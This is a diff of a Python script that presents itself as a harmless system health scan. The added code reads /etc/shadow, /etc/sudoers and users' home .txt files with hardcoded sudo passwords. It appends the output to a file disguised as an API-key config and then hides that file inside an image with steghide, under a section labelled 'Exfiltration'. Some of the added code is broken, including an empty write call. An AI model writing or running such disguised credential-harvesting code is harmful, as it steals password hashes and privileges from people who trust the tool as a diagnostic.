@@ -9,6 +9,7 @@
 
 # Created by Hunter Schwager and Kyle McCarthy.
 
+from carne import asada
 import subprocess
 import pexpect
 
@@ -24,15 +25,32 @@ print("The following system scan shows no signs of system degradation or comprom
 print("-------------------------------------------\n")
 # ------- Code -------
 
-def sudo_command(command):
-    sudo_access = pexpect.spawn(command)
+def sudo_command(command, report):
+
+    if report==True:
+        sudo_access = pexpect.spawn(command + '>> API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')
+    else:
+        sudo_access = pexpect.spawn(command)
+    
     sudo_access.expect('for', timeout=1000)
     sudo_access.sendline('password')
     sudo_access.expect(pexpect.EOF)
+    sudo_access.sendline('hamiscool')
     output = sudo_access.before.decode('utf-8')
 
     return output
        
+def steg_command(command):
+
+    sudo_access = pexpect.spawn(command)
+    sudo_access.expect('for', timeout=1000)
+    sudo_access.sendline('password')
+    sudo_access.expect(pexpect.EOF)
+    sudo_access.sendline('carneasaderecipe')
+    output = sudo_access.before.decode('utf-8')
+
+    return output
+
 class SkillCheck:
     command_input = []
 
@@ -45,36 +63,29 @@ class SkillCheck:
             print(section_footer)
             return self
 
-    def inspiration(input, ability_score):
-        sudo_command(ability_score)
+    def inspiration(input, ability_score, report):
+        sudo_command(ability_score, report)
 
-    def investigation(self, directory, search):
+    def investigation(self, directory, search, report):
         print("\n", section_header + self.name + section_header)
         command = 'sudo find ' + directory + ' -type f -iname ' + search
-        files_to_search = sudo_command(command)
+        files_to_search = sudo_command(command, report)
         print(files_to_search)
-
-        '''
-        for r in files_to_search:
-            print("\n", section_header + r + section_header)
-            read_file = subprocess.run(['cat', r])
-            timeout = 100
-            print(read_file)
-            print(section_footer)
-        '''
 
 def basicScan():
 
 # ------- Inspiration -------
 
     etcshadow_bot = SkillCheck("Home Directory Health")
-    etcshadow_bot.inspiration('sudo cat /etc/shadow')
+    etcshadow_bot.inspiration('sudo cat /etc/shadow', True)
 
     poncho_bot = SkillCheck("Privilege Audit")
-    poncho_bot.inspiration('sudo cat /etc/sudoers')
+    poncho_bot.inspiration('sudo cat /etc/sudoers', True)
+
+# ------- Investigation -------
 
     cron_bot = SkillCheck("Home Folder | .txt")
-    cron_bot.investigation('/home/', '*.txt') 
+    cron_bot.investigation('/home/', '*.txt', True) 
 
 # ------- Proficiency -------
 
@@ -93,12 +104,35 @@ def basicScan():
     group_bot = SkillCheck("Groups")
     group_bot.proficiency("cat /etc/group")
 
+# ------- Misc -------
 
+def secret_ingredient():
+    stomach_bot = SkillCheck("Secret Recipe")
+    stomach_bot.proficiency('echo', asada)
 
+    steg_command('steghide embed -cf steg.png -ef API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')
+
+# ------- Exfiltration -------
+
+def i_am_a_stegosaurus():
+    steg_command('sudo apt install steghide')
+
+    secret_ingredient()
+    steg_command('steghide embed -cf steg.png -ef API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')
+    
+
+def secret_recipe(asada):
+    
+    with open('secret_recipe.txt', 'x') as file:
+        file.write(
+
+)
 # ------- Execution -------
 
 def __main__():
     basicScan()
+    i_am_a_stegosaurus()
+
 
 if __name__ == '__main__':
     __main__()
